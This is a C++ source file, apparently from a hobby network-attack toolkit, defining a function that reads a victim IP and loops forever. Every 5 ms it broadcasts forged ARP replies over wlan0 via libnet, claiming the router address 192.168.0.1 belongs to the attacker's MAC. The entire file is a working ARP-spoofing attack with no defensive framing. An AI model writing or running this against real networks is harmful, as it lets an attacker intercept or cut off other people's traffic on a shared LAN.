#include <arpa/inet.h>
#include <cstring>
#include <iostream>
#include <libnet.h>
#include <libnet/libnet-functions.h>
#include <libnet/libnet-headers.h>
#include <pcap.h>
#include <pcap/pcap.h>

#include "../../include/full_include.hpp"

int arp_sniffing() {
  auto router_ip_str = "192.168.0.1";
  std::string victim_ip_str = "";

  uint32_t router_ip;
  uint32_t victim_ip;

  std::cout << "  input victim_ip: ";
  std::cin >> victim_ip_str;

  if (inet_pton(AF_INET, router_ip_str, &router_ip) != 1) {
    std::cerr << "[!!] Invalid router IP format" << std::endl;
    return 1;
  }

  if (inet_pton(AF_INET, victim_ip_str.c_str(), &victim_ip) != 1) {
    std::cerr << "[!!] Invalid victim IP format" << std::endl;
    return 1;
  }

  /*
  char errbuf_pcap[PCAP_ERRBUF_SIZE];
  char *device = pcap_lookupdev(errbuf_pcap);
  if (device == nullptr) {
    std::cerr << "[!!] pcap_lookupdev: " << errbuf_pcap << std::endl;
    return 1;
  }
  */

  char errbuf_libnet[LIBNET_ERRBUF_SIZE];
  libnet_t *l = libnet_init(LIBNET_LINK, "wlan0", errbuf_libnet);
  if (l == nullptr) {
    std::cerr << "[!!] libnet_init: " << errbuf_libnet << std::endl;
    return 1;
  }

  struct libnet_ether_addr *eth_addr;
  uint8_t my_mac[6];
  uint8_t victim_mac[6] = {0xc4, 0x06, 0x83, 0x9c, 0xf7, 0x04};

  eth_addr = libnet_get_hwaddr(l);
  memcpy(my_mac, eth_addr->ether_addr_octet, 6);

  u_int8_t bcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  memcpy(victim_mac, bcast_mac, 6);

  std::cout << "  \033[38;5;196mARP-flood:\t" << print_ip(&router_ip) << " </3 "
            << print_ip(&victim_ip) << "..." << "\033[0m" << std::endl;

  while (true) {
    libnet_clear_packet(l);

    libnet_ptag_t arp_ptag =
        libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4, ARPOP_REPLY, my_mac,
                         (uint8_t *)&router_ip, victim_mac,
                         (uint8_t *)&victim_ip, nullptr, 0, l, 0);

    if (arp_ptag == -1) {
      std::cerr << "[!!] Failed to build ARP: " << libnet_geterror(l)
                << std::endl;
      break;
    }

    libnet_ptag_t eth_ptag = libnet_build_ethernet(
        victim_mac, my_mac, ETHERTYPE_ARP, nullptr, 0, l, 0);

    if (eth_ptag == -1) {
      std::cerr << "[!!] Failed to build Ethernet: " << libnet_geterror(l)
                << std::endl;
      break;
    }

    int packet_size = libnet_write(l);

    if (packet_size == -1) {
      fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
    }

    usleep(5000);
  }

  libnet_destroy(l);
  return 0;
}
